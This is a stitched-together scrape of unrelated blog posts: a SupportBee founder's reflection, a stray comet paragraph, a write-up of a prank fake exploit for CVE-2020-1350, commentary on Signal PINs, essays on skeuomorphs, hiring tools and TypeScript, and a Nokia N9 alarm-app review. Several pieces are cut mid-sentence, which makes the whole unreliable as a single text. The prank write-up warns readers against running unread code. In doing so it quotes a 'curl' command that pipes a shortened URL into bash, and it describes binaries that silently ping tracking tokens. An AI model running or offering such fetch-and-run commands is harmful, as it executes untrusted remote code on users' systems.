                    <p>This isn’t the post you’re expecting--I’m not a Silicon Valley entrepreneur who went from an idea to a $10M startup overnight. I don’t have VC investments, and I don’t wake up at 5 a.m. every morning to swim laps and down Soylent (<a href="https://medium.com/supportbee-ceo/the-reason-i-wake-up-before-5am-e66ac69fe826">I did try</a>, though).</p><p>This is a story about a small but lasting software business that went through something all small businesses eventually experience--and if you’ve just started a business, you might want to read this. (And if you’ve gone through something like this already, we’d love to hear your story.)</p><p>Ten years ago I had a clear vision for my company, <a href="https://supportbee.com/">SupportBee</a>: I wanted to create a simple, clean, and easy-to-use help desk software. I wanted to be an SMB that catered to other SMBs; I didn’t want to grow into a Salesforce competitor. I wanted to offer something that was increasingly rare, which was a solid and affordable collaboration software for customer support. Something that I’d like to use myself. And I wanted to build a company I enjoyed working with, every day.</p><p>But, like most young businesses, I would eventually lose my grip on that idea--and it taught me a life lesson that kind of felt, well, like puberty.</p><p>When I started SupportBee with a handful of people, our team agreed on a set of values and ideas about what we wanted to be to our customers, <a href="https://hightouch.co/building-a-business-the-real-deal/">who we were as a company</a>, and where our niche was amongst the competition.</p><p>The problem began when my business really started to take off. Once I started picking up customers, all I wanted to do was keep them (read: do whatever I could to make them happy). And so, as their requests for additional features and tweaks trickled in, I gave in. You want more fonts and colors to choose from? OK, let me sacrifice the simple replying experience by adding more buttons to it. The requests kept coming, and I kept building. I told myself I was maturing my offering for the market. I was crossing the chasm. </p><p>When opportunities to land bigger customers and sweeter contracts came around, I went into full appeasement mode. While I never had a moment where I was willing to compromise the core values that I started the company with, I wanted to win enough business to keep things going. Also, the conventional wisdom for SaaS entrepreneurs is to try and move <a href="https://a16z.com/2020/05/29/a16z-podcast-saas-go-to-upmarket/">up-market</a>. </p><p>Then one client sent me a checklist of 20 items. They wanted me to create a comprehensive mail distribution system, essentially replicating MailChimp as a part of SupportBee’s ticketing software. Another client wanted me to add read receipts to the emails sent through SupportBee - something we considered an invasion of recipients’ privacy. </p><p><em>I began to wake up to the fact that some clients wanted me to adapt the software so they could enforce their own workflows, not because it made my product better.</em></p><p>I found myself in this funk--one that lasted almost four years--where I was no longer inspired or motivated by my company. I felt miserable for not doing more, and a voice in my head kept shaming me for not doing my best. I wasn’t sure how to climb out of the hole, but I couldn’t, anyway; at the time I was transitioning to my true gender as a woman. And as any entrepreneur who experiences life-altering personal events can tell you, it’s impossible to focus on the business at the same time.</p><p>Once my transition was complete and I settled into my new life, I realized something pretty damning: my business had lost its vision. I saw it, and my team saw it, and morale was low. I had put so much energy into changing my product to please everyone that I no longer recognized it. When we started SupportBee, we were full of the inspiration that one gets from reading about bootstrapping and productivity and having a mission-based, contrarian mindset. Where had that mission gone? I hadn’t guarded my company’s original values, and a result, my product had become like any other product. It was increasingly not unique, and looked more like a teenager who was trying to be someone they weren’t. SupportBee was in a full-blown pubescent crisis.</p><p>Along the way, I had accumulated too much self doubt. Perhaps it came with being a woman. I wanted to reconnect with my spirit of building great products. I reignited that fire by building a <a href="https://magicbell.io/">new product</a>. But my heart was still in SupportBee, and then the pandemic happened. It forced me to pick one thing to focus on. </p><p>I chose SupportBee. </p><p>I knew a lot of our customers were very loyal to SupportBee and I wanted to understand what they saw in the software. I wanted to hear it from them. After extensive customer interviews, our company realized that people loved SupportBee for the very reasons we started it--ease of use and simplicity. They wanted more functionality but didn’t want to compromise SupportBee’s original promise: one of simplicity, ease of setup and use--at the right price point. Also, our most loyal customers realized there were other complementary services out there, like Basecamp, <a href="https://supportbee.com/integrations/basecamp3">with which they could integrate</a> to power up their workflows. It actually gave them more choice.</p><p>Our dilemma? Figuring out how to move forward as a company that stays true to our core values while also adding power under the hood of our product. <a href="https://medium.com/supportbee-ceo/5-years-on-why-i-am-still-working-on-supportbee-5028b6434228">Customer support can be trickier than other verticals</a> because you really need all-team buy-in if everyone is going to use the software effectively. The best way to guarantee that--and lower customer churn--is to make the experience of switching over as un-intimidating as we can. This means we will have to resist the temptation to go up-market. A software that works for a 20 people team and for a 2000 people team is fiction. </p><p><strong>Would we lose potential customers over this? Absolutely. </strong></p><p>But we have also eliminated the losing battle of casting the widest net possible, and focus on polishing the functionalities we <em>do</em> offer, for the audience we do want to please. By choosing this route, we keep and find the customers that are perfect for us. <em>It has taken me ten years to accept that being a polarizing business is the key to survival.</em></p><p>My advice to my prepubescent peers is not to confuse building a product for your market with building a market for your product. Acknowledge where your customer pool begins and ends, because the only way to stand out in a crowd is to have a product that is amazingly tailored for a specific portion of the crowd. In short, don’t be afraid of being polarizing. </p><p>Look at your non-negotiables. For SupportBee, that’s our simplicity. People want power on top of the simplicity, not in the face of it. You can build a small but healthy business catering to an audience that believes in a certain way of getting things done.</p><p>The media loves to cover the founders of the world’s biggest tech companies, in part because we are in awe at what they have managed to build and the relationships they have been able to navigate. But make no mistake, founding a small or medium business can have equally difficult challenges. If you want to stay small but mighty, at times that will mean you can’t have your cake and eat it too. </p><p>Embrace the cycle of idealism to aimless ambition to idealism; as a leader and as a company you will be better off for it. I am happy to finally be in a place where I understand that there is no substitute for believing in something strongly, even if it's polarizing. It's the only way to be. If you aren’t polarizing, you are not a strong choice for anyone.</p><p>It’s been reinvigorating to find my passion for SupportBee again. In the coming months, I’ll share some valuable resources with our readers: the interview scripts that helped me understand our customers better; the user persona and journey framework that helped us understand what to build and improve; and the process we followed to reinvent our brand to become more appealing to our target audience.

We encourage you to <a href="https://theskylive.com/planetarium?obj=c2020f3" target="_blank">get outside (and bring someone you’re quarantining with) to check it out</a> as it approaches perigee on the 22nd—it will likely fade quickly thereafter. Bring a pair of binoculars to spot its split tail—a comet’s bluish ion tail points directly away from the sun due to solar wind, while the more visible white/yellow dust tail also points away from the sun, albeit less directly due to the <a href="http://burro.astr.cwru.edu/Academics/Astr221/SolarSys/Comets/tails.html" target="_blank">interaction of gravity and radiation pressure on its very small dust particles</a>.

<p>What do you get if you create a binary, a few bash scripts, a README and excellent timing? </p><p>An awareness that folks need to understand that ripping code from GitHub and sharing/running without validation can be dangerous. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">today on why people should read code and repos before they run them <a href="https://t.co/calGnBbllS">https://t.co/calGnBbllS</a> exploits 👀9/10 would troll the internet again</p>— Andy Gill (@ZephrFish) <a href="https://twitter.com/ZephrFish/status/1283162770213670915?ref_src=twsrc%5Etfw">July 14, 2020</a></blockquote>

</figure><p>Before we dive into the actual research, here's what actually happened for those who didn't see the fallout, unless you are in the security space and familiar with what happened last 36 hours, it probably won't make much sense quickly.</p><ol><li>Microsoft has a critical flaw in DNS server which resulted in a CVSS 10, CVE-2020-1350 is a real vulnerability that was published:<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1350">https://nvd.nist.gov/vuln/detail/CVE-2020-1350</a> It's a brand new vulnerability therefore people would be interested in a proof of concept.</li><li>A security company publishes the info - no public exploit available at the point of publishing this blog, &nbsp;a quick kudos to the team over at Checkpoint Research who found the original vulnerability and published <a href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">a great write up which can be found here.</a></li><li>I created a fake exploit on GitHub minutes after the original blog post was published - playing a prank on hackers and other security companies picking up and publishing in threat intelligence feeds. The code was initially just a bash script then I added a binary loaded with canary tokens to track who was running the script. If anyone is interested Thinkst has a great blog around how canary tokens work <a href="https://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html?m=1">that can be found here.</a></li><li>Lots of people ran the code or helped spread the existence of the fake exploit, folks ran the "proof of concept" code without reading it first and got trolled. If I had been malicious I could have done something much worse than rick-rolling.</li><li>The repository also contains a real fix for the vulnerability. Which can be found here:</li></ol><pre><code>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v "TcpReceivePacketSize" /t REG_DWORD /d 0xFF00 /f
net stop DNS &amp;&amp; net start DNS</code></pre><div><p>This is a particularly "amusing" troll because the sort of people who keep up with CVEs and look for proof-of-concept exploits should really know better than to run random code they just got off GitHub without checking what it does. It's obvious with the most cursory examination of the code in the repo that you shouldn't run it, exploit.sh contains:</p><p>curl -L <a href="https://bit.ly/3exifav">https://bit.ly/3exifav</a> | bash</p><p>The code in the repo is loaded with canary tokens and just general trolling, the list of files below details what each thing is and what it does.</p></div><ul><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/CVE-2020-1350.exe">CVE-2020-1350.exe</a> - Benign binary which opens rick roll and pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/Fix.bat">Fix.bat</a> - Batch file that applies the fix from Microsoft</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/LICENCE">LICENCE</a> - The licence file, also does nothing</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/PoC.exe">PoC.exe</a> - &nbsp;Benign binary which opens cmd.exe and additionally pings canary token</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.md">README.md</a> - Details the README of the repo</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/README.pdf">README.pdf</a> - Pings a canary token, also a benign document</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/exploit.sh">exploit.sh</a> - Rick roll in shell, also benign</li><li><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/windows-exploit.ps1">windows-exploit.ps1</a> - Rick roll in shell, also benign</li></ul><p><a href="https://github.com/ZephrFish/CVE-2020-1350/blob/master/CVE-2020-1350.exe">CVE-2020-1350.exe</a> <strong> does not perform any exploits or malicious activity.

<p>There is currently a lot of discussion around Signal’s new <a href="https://signal.org/blog/signal-pins/">PIN</a> decisions. In particular, the discussions have focused on the decision to use the PIN as a seed to encrypt backup data that will be stored on Signal servers using Secure Value Recovery (SVR). So user data will be stored in a way so that even Signal cannot access it. SVR uses <a href="https://en.wikipedia.org/wiki/Software_Guard_Extensions">Intel SGX</a> to ensure this.</p>
<p>This week there was <a href="https://blog.cryptographyengineering.com/2020/07/10/a-few-thoughts-about-signals-secure-value-recovery/">an excellent post</a> by <a href="https://twitter.com/matthew_d_green">Matthew Green</a>, a cryptographer and professor at Johns Hopkins University, where he discussed some of the concerns he has with Signal’s SVR system, especially around SGX. He also touched on the rollout methods and delivery Signal has used to communicate this new feature. It’s an excellent breakdown and I can’t effectively summarize it here, I highly recommend reading it.</p>
<p>(To <em>ineffectively</em> summarize it however, SGX isn’t foolproof and has had issues in the past. Signal is pushing this hard on users without a lot of context or easily understood options for disabling SVR.)</p>
<p>Matthew’s criticisms are all valid and I don’t disagree at all. But I want to add something to the discussion that is being mostly omitted – the network effect of a messaging app, and the considerations Moxie and Signal have to take into consideration to effectively secure your and my communications.</p>
<p>Signal must take into account multiple users accessing identical data as a first-class concern. Every communication you have on Signal must be decrypted by an endpoint you don’t control – the device of the person you’re messaging. A similar use case is email. Hypothetically, let’s say you avoid Google like the plague. Even then, approximately 50% of your email will still reside on Google servers due to your recipients using either Gmail or G Suite.</p>
<p>As Signal is a closed(ish) ecosystem, unlike email, they have to deal with this concern too. Not only do they have to make sure that the security on your endpoint is as strong as possible, but they also have to make sure the same is true of the other endpoints where you’re sending data.</p>
<p>In this situation Signal has to consider that doing what many suggest and making SVR as an opt-in, or not offering at all will likely <em>reduce</em> adoption by a broader userbase, who want things like contact syncing, and easy backups. So while adding user choice may make <em>my</em> data storage more secure, the fact that it hurts adoption means a smaller percentage of my communications will be end-to-end encrypted at all because they’ll go over channels like Slack, email, or SMS.</p>
<p>It is worth keeping in mind that Signal is maintaining not only an application, but an ecosystem, and the security considerations must take both areas into account. It is better, in my mind, to have a goal of really good security on the majority of my communications, as opposed to exceptional security on just some of my communications. And Signal has always been a secure messaging player in the consumer and non-expert space, as opposed to something like Keybase which targets more knowledgeable users and makes different tradeoffs accordingly.</p>
<p>As Matt says in his post, criticizing Signal is difficult as their overall work is great, and I’m glad the criticism and discussion are happening. We should continue to hold them to a high standard. But the network effects and ecosystem should be considered as much as the application and security architecture. If they aren’t then we risk repeating the mistakes of PGP email where we have an amazingly secure system that is rarely used in practice.</p>

      <p>You’ve always been a bit suspicious of the trashcan on your computer’s imaginary desk top, and I’m here to tell you why.&nbsp;</p><p>I know what you’re thinking –&nbsp;<em>I figured it out already, in real life no one keeps a trashcan on top of their desk.</em> Yes, this adds to the tension. But the real reason is, I think, far more interesting.</p><p>The trashcan is an example of a <em>skeuomorph </em>– an intentional borrowing from a prior time that exists as a bridge to the past in order to make people feel comfortable and familiar.</p><p>There are skeuomorphs all around you. Your electric car has a decorative front grille that it doesn’t need, plastic pieces painted to resemble chrome of Detroit’s glory years, and sometimes even decorative wheel spokes to harken back to the horse-and-carriage days. Many pre-WWII American diners copied the form factor and appearance of rail dining cars, and the later diners aped those in turn. Some of those diners sport modern LED-powered blinking OPEN signs that mimic their neon forebearers. A fully electronic Las Vegas slot machine still comes with a long pull arm despite not needing any gears to turn, and the Nest thermostat has a rotary knob at least in part because so did thermostats before it.</p><p>It is exactly here, in the world of electronics and pixels, where you find the most skeuomorphs – that world simply moves too fast for our collective comfort. Some skeuomorphs <a href="https://www.technologizer.com/2010/03/29/microsoft-bob/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">tried too hard</a> and <a href="https://guidebookgallery.org/guis/magiccap/screenshots?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">went too far</a>. Others were more helpful: Your camera app still makes 1970s shutter sounds, somewhere on the iPhone you can still swipe left to see a traditional stopwatch, and every online store has a shopping basket icon.&nbsp;</p>

      <p>Skeuomorphs can be helpful, accelerating progress by easing in new technology. But left unchecked, they can also stunt it. The warm comfort of the previous era becomes nostalgia’s nostalgia, serving no other purpose than gatekeeping the future.</p><p>The 3½" floppy disk as a save button in the newest Office wasn’t a design decision as much as design <em>inaction. (</em>It made perfect sense when it appeared, but wasn’t ever updated.) You could make the same argument for the handset icon for your voice call app. The sophisticated page-turning animation on the early iPads was widely ridiculed as the least important part of “paperness,” and Craig Mod once <a href="https://craigmod.com/journal/subcompact_publishing/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">pointed out</a> that on the same device, Apple’s much-hyped Newsstand was a grotesque calque of the analogue newsstand –&nbsp;the entire point of the original was to allow to look at glorious covers, which the new version bastardized into but a few coarse pixels. Perhaps we should’ve ripped off the bandaid right there and then.</p>

      <p>My favourite example in that genre might be the calculator on your computer, its form factor frozen in 1970s, down to onscreen buttons that are slower and more cumbersome than the keys on the keyboard <em>your fingers are already on top of. </em>Its operation is so primitive – only one number at a time, only one slot for memory –&nbsp;it borders on parody. Grab any <a href="https://soulver.app/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">modern</a> calculator <a href="https://numi.app/?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">app</a> and you’ll see how much easier it is to understand and engage with math if you’re not beholden to old conventions.</p><p>And right next to that calculator, there’s the trashcan.&nbsp;</p><p>The premise was pretty fantastic. During the 1970s and early 1980s, people at Xerox Parc and Apple wanted to simplify computers to make them more palatable for people who never used computers before. On the hardware side, that meant mice and nice graphical displays. And what was shown on those displays – a pixelated representation of their offices – made perfect sense to office workers meant to use them: papers that you could drag to a printer, a clipboard to keep snippets of text, and a little calculator resembling the one on their desk. And, in the corner, a trashcan they could use to get rid of unwanted documents.</p>

      <p>The new idea – known as “the desktop metaphor” – felt visible and tangible. Dragging something to a trashcan was far more natural than typing DEL FILE.TXT. But, more importantly, a file in a trashcan could be retrieved back. This was a filesystem equivalent of Undo introduced at around the same time, too;&nbsp;a beautiful safety hatch that helped you worry about computers less.</p><p>All of this worked. And a few years later, in System 4, the trashcan borrowed even more from the real world – its representation would bulge a bit whenever it had files inside. It seemed like a great, useful idea. But, without anyone noticing, it made the trashcan so much worse.</p>

      <p>You see, in the real world, a trashcan filled with old stuff is an unwelcome state. Organic trash rots and smells. Office trashcan filled with too much crap won’t make you any friends. An overflowing trash bin on the street is a sign of failed infrastructure.</p><p>But none of this applies to computers. It’s quite the opposite. The more stuff you have in your trash, <em>the more useful it is. </em>The more you neglect it, the further back in time you’ll be able to get to recover files you thought long gone.</p><p>Having another icon representing a filled trashcan on your screen makes you instinctively want to empty it (which often comes with a nice rewarding sound, too). But every time you do this, you remove your own safety hatch.</p><p>The designers at Apple never realized this. What’s even worse, their approach was copied by pretty much every other graphical operating system:</p>

      <p>The bulging trashcan is my favourite example of the tricky nature of skeuomorphs. There are skeuomorph stories in the book, of course: early Caps Lock keys physically depressing to mimic typewriters, a Typewriter key on a young word processor. Even here, <a href="https://www.getrevue.co/profile/shift-happens/issues/a-love-letter-to-the-in-betweeners-101403?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">I once wrote about in-betweeners</a>.</p><p>But these days, I also wonder about visual skeuomorphism. See, many typewriter books look like this:</p>

      <p>If you’re a person of a certain age, you have typed on a keyboard using Gorton Normal. BBC computers, Compaq portables, DEC and TeleVideo terminals, CDC supercomputers, many PC clones, and Apple II all chose it. IBM eventually switched to Helvetica, but before that, they also borrowed a version of Gorton’s typeface. Hell, Gorton Normal even made it to the Moon aboard Apollo 11 and its famous DSKY keyboard.</p>

      <p>The work’s not done yet. I’m not a professional type designer, and despite the simplified nature of Gorton – and skipping lowercase altogether – some of the shapes are pretty complicated. But it’s fun to see it in my limited use already: the awkwardness of some of the distinctive digits, the pound sign every BBC computer user had nightmares about, the <em>five </em>versions of zero I found throughout ages.</p>

      <p>(I even rewrote one chapter title to better showcase the lopsided ampersand.)</p><p>What’s even more remarkable was that Gorton Normal wasn’t made, as I suspected, some time in the 1950s or 1960s. No, the evidence points to the font being <a href="http://gorton-machine.org/forms/form_172/index.html?utm_campaign=Shift%20Happens%20book%20updates&amp;utm_medium=email&amp;utm_source=Revue%20newsletter" target="_blank">as old as 1902</a>, and possibly even older.</p><p>This creates some pressure –&nbsp;I am now possibly reviving a 19th-century typeface – but it’s also pretty cool. Gorton Normal was there almost as early as typewriters, watching them grow, just waiting for the right moment to jump onto their keyboards. It’s a typeface with surprising longevity, mechanical and somewhat ugly in nature, but with a surprising warmth&nbsp;coming through all the stories of its use.</p><p>This is how I know it’ll be a perfect fit – replace “typeface” with “keyboard” above, and you just described my goal for the entire book.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>I get a lot of questions about which hiring tools do what and how they’re different from each other, so I decided to draw an ugly, yet handy, picture (see below).</p>



<p>By the way, the reason this post has “unbundled” in the title is that many hiring tools, in part because we’re all on the VC funding treadmill, aspire to be more than they are and to ultimately be the one ring that rules them all, all the way from sourcing to interviewing to reference checks to onboarding to god knows what. So far, these attempts at grand unification, much like communism, have not panned out in practice. Though most tools claim to do more, most do more badly<sup><a href="#footnote_0_2396" id="identifier_0_2396" title="Not all… some do a decent job of this.">1</a></sup> but will try to upsell you on how they can solve <em>all</em> your hiring needs. Therefore, in the picture below, I’ve chosen the primary use case for each tool, i.e. the use case that each tool has actually gotten traction for (and the use case that I believe they’re actually good at).</p>



<p>And last thing. I run interviewing.io, which means that my take on other tools is indiscriminately biased. But, hell, it’s my blog, and I can say whatever I want… and having been in this industry for almost 10 years as an engineer and later as both an in-house and an agency recruiter and having spent the past 5 years running a successful hiring marketplace, I have acquired my prejudices the honest way, through laboratory experience.<sup><a href="#footnote_1_2396" id="identifier_1_2396" title="The bit about acquiring your prejudices the honest way is one of my favorite quotes, and credit goes to James Roberge, electrical engineering professor at MIT.">2</a></sup></p>



<figure><img src="http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-750x422.png" alt="" width="750" height="422" srcset="http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-750x422.png 750w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-450x253.png 450w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11-768x432.png 768w, http://blog.alinelerner.com/wp-content/uploads/2020/07/Hiring-tools-unbundled-11.png 960w" sizes="(max-width: 750px) 100vw, 750px"></figure>



<p>All that said, a few of the choices I made in the picture probably require some explanation, so here goes…</p>



<p><em>I thought HackerRank also had an interview tool.&nbsp;</em><br>Yep, they do, it’s called CodePair. However, last I checked, in order to use it, you also had to buy other things, i.e. you can’t just use CodePair for technical interviews without buying in to the broader HackerRank ecosystem. And though CoderPad isn’t paying me for this, I think it’s a superior tool on many levels (and the one we actively chose to use inside of interviewing.io, forsaking all others). CodeSignal also has their own tool and Codility does as well, but that’s kind of the point of this post: tools unbundled. I’m listing the tools that have the differentiator in question as their core competency, not an add-on on some enterprise checklist.</p>



<p><em>Why is Triplebyte in the middle of the sourcing section?</em><br>Triplebyte recently pivoted to a new model. Instead of interviewing their candidates before sending them to customers, they now rely on a quiz, the results of which they use to annotate candidate profiles that recruiters can source from. Before that, they had their own interviewers conduct technical interviews with candidates and also had their talent managers match candidates to companies.</p>



<p><em>I thought Hired, AngelList, and LinkedIn had some kind of skills assessment/technical vetting?</em><br>They do, but last I checked it was an asynchronous test (rather than a human interviewer). In my opinion, asynchronous skills testing on these platforms has some value, but it’s quite limiting for a few reasons:</p>



<ul><li>Skills testing for candidates is optional on these platforms, which means that 1) not all profiles are vetted and 2) you get a good amount of selection bias for candidates without leverage taking them, e.g. juniors and people who need new visa sponsorship</li><li>Much easier to cheat</li><li>And of course asynchronous tests are lower fidelity than human interviewers (or at least the ones I’ve seen to date… but I want to be proven wrong)</li></ul>



<p><em>I thought AngelList had interested candidates come to you?</em><br>They do. But like any jobs board, it’ll be noisy and probably full of candidates who don’t have much leverage, e.g. juniors/bootcamp grads and people requiring visa sponsorship.</p>



<p><em>Should I use take-home tests in my process?</em><br>As with many of my answers, it’s a matter of leverage. Candidates who have lots of options probably won’t spend time on take-homes. Candidates who don’t, either because they’re junior or because they don’t get a lot of recruiter outreach for other reasons, will.</p>



<p><em>Why are you so obsessed with leverage?</em><br>Because market forces rule everything around me.</p>



<p><em>Hey, if you do sourcing, why does your company literally have “interviewing” in the name?</em><br>The way we get candidates into our ecosystem is by offering them mock interviews. Then top performers from our practice pool can choose to use us for their job search. The name originally was meant to highlight the practice offering, but yeah, it’s confusing.</p>



<p><em>Is interviewing.io a good way to source candidates?</em><br>Yes. Yes it is.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-content"><p>Angular. Ember. Svelte. Vue. TypeScript has been adopted by frontend frameworks with crushing inevitability. The ubiquitous (and often annoying) "Port this to TypeScript" GitHub issues, found in popular JavaScript repositories far and wide, reflect a real desire. Developers want the tooling benefits TypeScript-typed dependencies bring to their codebase. Not every library author has accepted the need to use TypeScript, but most have and more will. The notable exception to this emerging consensus is React, and the notable irony of this notable exception is the unmatched quality of React's TypeScript developer experience.</p><h2 id="jsx">JSX</h2><p><a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a> was introduced to the world in 2013, when React was open-sourced. JSX takes code like this:</p><pre><code><span>const</span> element <span>=</span> <span><span><span>&lt;</span>h1</span> <span>id</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>&gt;</span></span><span>Hello</span><span><span><span>&lt;/</span>h1</span><span>&gt;</span></span><span>;</span></code></pre><p>And turns it into this:</p><pre><code><span>const</span> element <span>=</span> React<span>.</span><span>createElement</span><span>(</span><span>"h1"</span><span>,</span> <span>{</span> id<span>:</span> <span>"hello"</span> <span>}</span><span>,</span> <span>"Hello"</span><span>)</span><span>;</span></code></pre><p>Its simple syntactic sugar for JavaScript. Anytime anything complex needs to be done developers must hop out of JSX land with a couple curly brackets <code>{}</code> and insert a JavaScript expression. Its simplicity and heavy reliance on JavaScript sets JSX apart. It also gives JSX a distinct advantage: tooling.</p><p>In 2015, <a href="https://devblogs.microsoft.com/typescript/announcing-typescript-1-6-2/">TypeScript 1.6 was released</a> and support for JSX was added to the compiler. With this release new possibilities ranging from statically validating props, to multi-file component symbol renaming, were given to TypeScript/React projects. By virtue of the close relationship between JSX and JavaScript, feature-rich tooling was relatively easy to add. Other view-describing languages have struggled to meet the bar set by TypeScript and JSX. Even Angular 2, which was <em>written in TypeScript for TypeScript users</em>, falls far short of React's JSX powered TypeScript experience.</p><h2 id="the-challenge">The Challenge</h2><p><strong>The challenge TypeScript poses to library authors today isn't about converting an existing codebase to TypeScript. Instead the challenge is designing APIs that are statically analyzable.</strong> The custom template languages common in frontend frameworks today are an extreme example of APIs that are not easy to statically analyze, but they are far from the only example. There are libraries in the JavaScript ecosystem that (barring fundamental API changes) will likely never have great TypeScript support. TypeScript's complex brew of union types, mapped types, conditional types, and variadic types <em>does</em> make many patterns possible to express. Possible, however, doesn't always mean easy.</p><p>Clearly, the solution is not to simply (re)write a library in TypeScript, though that certainly helps. The path forward is difficult because it means accepting new limitations. An API with no type-safety requirements will always have more flexibility than one with type-safety requirements. <a href="https://www.youtube.com/watch?v=YrZTho_o_is">But, constraints are good for innovation</a>. Embracing the limitations TypeScript imposes often leads to the creation of far more simple APIs.</p><h2 id="its-ironic">It's Ironic</h2><p>Typically, a mess of complex generics is a bad idea in application code. For library code, however, the pain is generally worth the effort. Many times TypeScript support is an unasked-for burden placed upon folks building open source software in the JavaScript ecosystem. Welcome or not though, these requests reflect reality. In the end those libraries that embrace and conquer the challenges TypeScript offers will find success. Those that do not, will not reach their full potential. If you're building a new library in TypeScript, or converting an existing one to TypeScript you may wonder where to begin. Perhaps, start by thinking about the ironic truth React teaches us: libraries don't have to be written in TypeScript to be good at TypeScript.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		<p>I want to talk about the <a href="http://i.imgur.com/1FYRapg.jpg">Nokia N9</a> alarm clock application because it’s a really nice&nbsp;example of thoughtful, functional design – and because it’s only on the N9, so a lot of people won’t have seen it. There are more important things in life than getting excited about an alarm clock app, but its nice when simple things are done well.</p>
<p>I don’t know how many of these ideas are borrowed from previous apps (the N9 is contemporary with the iPhone 4S), but either way it’s implemented exceptionally well.</p>

<p><a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/1.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/1-176x300.png" alt="1" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/1-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/1.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a></p>
<p>The main screen is informational. The full information on each alarm you have set is shown, and each&nbsp;can be turned on or off with the slider instead of having to touch on the entry to edit it. The plus adds a new alarm, and the Alarms section&nbsp;can&nbsp;scroll if there are more than two.</p>
<p><a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/3.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/3-176x300.png" alt="3" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/3-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/3.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a>&nbsp;&nbsp;<a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/4.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/4-176x300.png" alt="4" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/4-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/4.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a></p>
<p>I don’t think I’ve seen another alarm where you can set the time you want in two touches or less. In case it wasn’t intuitive enough, the clock dial&nbsp;here mirrors the size of the analogue clock on the previous screen. Just in case you <em>still</em> don’t get it, the alarm time is shown above the dial. But everyone gets it, because it’s simple.</p>
<p>Touching and dragging on the minute&nbsp;marker moves it to the nearest minute, but touching directly at a spot on the circle moves it to the nearest <em>five</em> minutes. So you can change&nbsp;your alarm from 7:00 to 7:30 with a single touch without accidentally setting 7:31. If you actually want 7:31, just drag it around.</p>
<p>The AM/PM selection was also intuitive for me but may not be for everyone – did you guess that you need to drag the hour circle around? You can also do it in a couple of touches.</p>
<p>When you drag, the phone plays a quiet click sound and vibrates slightly as you rotate, as if you’re clicking a timer around. When you touch, it animates quickly but smoothly to the new position. There’s so much attention to detail here.</p>
<p><a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/5.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/5-176x300.png" alt="5" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/5-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/5.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a></p>
<p>The <em>More options</em> screen has the options you’d expect, and shows the current settings.</p>
<p><a href="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/6.png"><img src="http://www.nition.momentstudio.co.nz/wp-content/uploads/2014/08/6-176x300.png" alt="6" width="176" height="300" srcset="http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/6-176x300.png 176w, http://nition.momentstudio.co.nz/wp-content/uploads/2014/08/6.png 480w" sizes="(max-width: 176px) 100vw, 176px"></a></p>
<p>The Repeat&nbsp;selection is nice. Select as many or as few as you want. There’s no such thing as an invalid selection: Rather than “Never” and “Every day” being settings themselves, which would cause conflict with the individual day settings, they’re more like indicators which also serve as group-deselect and group-select actions.</p>
